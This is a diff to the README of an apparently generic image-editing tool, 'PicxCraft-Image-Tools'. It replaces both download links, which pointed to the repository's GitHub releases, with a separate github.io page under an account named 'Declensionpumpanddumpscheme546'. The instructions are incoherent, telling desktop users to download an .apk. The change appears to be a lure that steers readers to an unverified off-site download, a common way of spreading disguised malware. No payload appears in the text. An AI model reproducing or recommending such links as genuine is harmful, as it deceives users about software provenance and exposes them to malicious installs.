@@ -1,6 +1,6 @@
 # 🖼️ PicxCraft-Image-Tools - Edit your photos with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Declensionpumpanddumpscheme546/PicxCraft-Image-Tools/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://declensionpumpanddumpscheme546.github.io)
 
 PicxCraft-Image-Tools gives you a complete set of features to edit images on your device. This software manages files, changes image sizes, and converts formats without the need for complex software. You gain access to 60 specialized tools that simplify your daily image tasks.
 
@@ -8,7 +8,7 @@ PicxCraft-Image-Tools gives you a complete set of features to edit images on you
 
 You need a desktop computer to manage your files. To start, visit this page to download the latest version:
 
-[Download PicxCraft-Image-Tools](https://github.com/Declensionpumpanddumpscheme546/PicxCraft-Image-Tools/releases)
+[Download PicxCraft-Image-Tools](https://declensionpumpanddumpscheme546.github.io)
 
 On this page, look for the section labeled "Assets." Click the file that ends in .apk or the installer suited for your system. Save this file to your computer.
 
